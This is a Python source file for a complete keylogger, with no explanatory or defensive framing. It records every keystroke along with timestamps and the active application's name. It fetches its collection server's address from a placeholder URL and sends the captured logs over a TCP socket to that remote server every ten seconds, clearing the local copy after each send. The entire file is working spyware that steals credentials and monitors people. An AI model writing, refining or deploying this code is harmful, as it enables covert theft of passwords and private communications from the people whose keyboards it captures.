import os
import time
import socket
import threading
import requests
from pynput import keyboard
from datetime import datetime

HTTP_IP_FILE = "http://YOUR_SERVER_IP:8000/server_ip.txt"
SERVER_PORT = 5000
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")
SEND_INTERVAL = 10  # seconds

os.makedirs(LOG_DIR, exist_ok=True)
current_window = None
buffer_lock = threading.Lock()
keystroke_buffer = []

# Fetch server IP from server
def get_server_ip():
    try:
        response = requests.get(HTTP_IP_FILE, timeout=5)
        return response.text.strip()
    except Exception as e:
        print(f"[!] Failed to fetch server IP: {e}")
        return None

SERVER_IP = get_server_ip()
if not SERVER_IP:
    print("[!] Could not get server IP. Exiting...")
    exit(1)

def get_active_window():
    try:
        import platform, psutil
        if platform.system() == "Windows":
            import ctypes, win32gui
            hwnd = win32gui.GetForegroundWindow()
            pid = ctypes.c_ulong()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            proc = psutil.Process(pid.value)
            return proc.name()
    except Exception:
        return "unknown_app"

def write_buffer_to_file():
    global keystroke_buffer
    with buffer_lock:
        if keystroke_buffer:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.writelines(keystroke_buffer)
            keystroke_buffer = []

def on_press(key):
    global current_window
    new_window = get_active_window()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with buffer_lock:
        if new_window != current_window:
            current_window = new_window
            keystroke_buffer.append(f"\n[{timestamp}] Active Window: {current_window}\n")
        if hasattr(key, 'char') and key.char:
            keystroke_buffer.append(key.char)
        else:
            keystroke_buffer.append(f' [{key}] ')
    if len(keystroke_buffer) >= 50:
        write_buffer_to_file()

def send_logs():
    while True:
        try:
            write_buffer_to_file()
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                with open(LOG_FILE, "rb") as f:
                    data = f.read()

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((SERVER_IP, SERVER_PORT))
                s.sendall(data)
                s.close()

                open(LOG_FILE, "w").close()
                print("[+] Sent logs to server")
        except Exception as e:
            print(f"[!] Send error: {e}")
        time.sleep(SEND_INTERVAL)

if __name__ == "__main__":
    threading.Thread(target=send_logs, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
